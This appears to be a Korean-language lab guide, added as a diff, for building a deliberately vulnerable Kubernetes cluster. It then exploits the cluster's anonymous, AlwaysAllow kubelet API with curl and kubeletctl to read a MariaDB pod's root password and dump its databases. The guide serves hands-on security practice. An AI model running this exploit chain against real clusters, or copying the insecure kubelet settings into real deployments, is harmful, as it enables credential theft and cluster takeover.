@@ -1,0 +1,95 @@
+🚀 쿠버네티스 인증/인가 취약점
+✅ 목표: 쿠버네티스에서 kubelet 인증/인가 취약점을 활용하여 데이터베이스 탈취
+✅ 환경: Ubuntu 20.04
+✅ 구성 요소: Kubernetes	v1.28.15 kubeletctl	v1.9 Docker	v20.10.7 containerd	v1.6.4 Calico CNI	v3.26.1
+
+
+🔥 1. 시스템 준비 (필수 패키지 설치 & 설정)
+# 패키지 업데이트 및 필수 도구 설치
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y curl apt-transport-https ca-certificates gnupg2 software-properties-common jq
+
+# Swap 비활성화 (쿠버네티스 요구사항)
+sudo swapoff -a
+sudo sed -i '/ swap / s/^/#/' /etc/fstab
+
+# Docker 설치
+sudo apt install -y docker.io
+sudo systemctl enable --now docker
+sudo usermod -aG docker $USER
+👉 ⚠️ 로그아웃 후 다시 로그인 필요 (docker 명령어 사용 가능하도록 적용됨).
+
+🔥 2. Kubernetes 설치 및 초기화
+# Kubernetes 저장소 키 및 저장소 추가
+sudo mkdir -p /etc/apt/keyrings
+curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.28/deb/Release.key | sudo tee /etc/apt/keyrings/kubernetes-apt-keyring.asc > /dev/null
+echo "deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.asc] https://pkgs.k8s.io/core:/stable:/v1.28/deb/ /" | sudo tee /etc/apt/sources.list.d/kubernetes.list
+
+# Kubernetes 설치
+sudo apt update
+sudo apt install -y kubelet kubeadm kubectl
+sudo systemctl enable --now kubelet
+
+# 쿠버네티스 클러스터 초기화
+sudo kubeadm init --pod-network-cidr=192.168.0.0/16
+
+# kubeconfig 설정 (사용자 계정 적용)
+mkdir -p $HOME/.kube
+sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
+sudo chown $(id -u):$(id -g) $HOME/.kube/config
+
+# 네트워크 플러그인 (Calico) 설치
+kubectl apply -f https://raw.githubusercontent.com/projectcalico/calico/v3.26.1/manifests/calico.yaml
+👉 kubectl get nodes 실행하여 Ready 상태 확인.
+
+🔥 3. kubelet API 인증/인가 취약점 설정
+# kubelet 설정 수정 (익명 접근 허용)
+sudo vi /var/lib/kubelet/config.yaml
+👉 아래 내용 수정 (추가/변경)
+authentication:
+  anonymous:
+    enabled: true
+authorization:
+  mode: AlwaysAllow
+
+# kubelet 재시작
+sudo systemctl restart kubelet
+👉 쿠버네티스 Kubelet API가 인증 없이 접근 가능해짐.
+
+🔥 4. MariaDB 파드 배포
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: mariadb
+  namespace: default
+spec:
+  containers:
+  - name: mariadb
+    image: mariadb:latest
+    env:
+    - name: MYSQL_ROOT_PASSWORD
+      value: "rootpassword"
+EOF
+
+# 파드 상태 확인 (Running 상태 확인)
+kubectl get pods -n default
+
+🔥 5. kubelet API 활용하여 공격 실습
+
+# kubelet API 직접 호출 (파드 목록 가져오기)
+curl -k https://127.0.0.1:10250/pods | jq
+
+# kubeletctl 도구 설치
+wget https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64
+chmod +x kubeletctl_linux_amd64
+sudo mv kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
+
+# kubeletctl로 MariaDB 환경 변수 가져오기
+kubeletctl exec -n default -p mariadb -c mariadb -- /bin/sh -c 'env | grep MYSQL'
+👉 출력 예시 (MYSQL_ROOT_PASSWORD=rootpassword)
+
+
+# kubeletctl로 MariaDB 내부 접근 후 데이터베이스 탈취
+kubeletctl exec -n default -p mariadb -c mariadb -- /bin/sh -c 'mysql -u root -p$MYSQL_ROOT_PASSWORD -e "SHOW DATABASES;"'
+👉 출력 예시: information_schema, mysql, performance_schema, sys
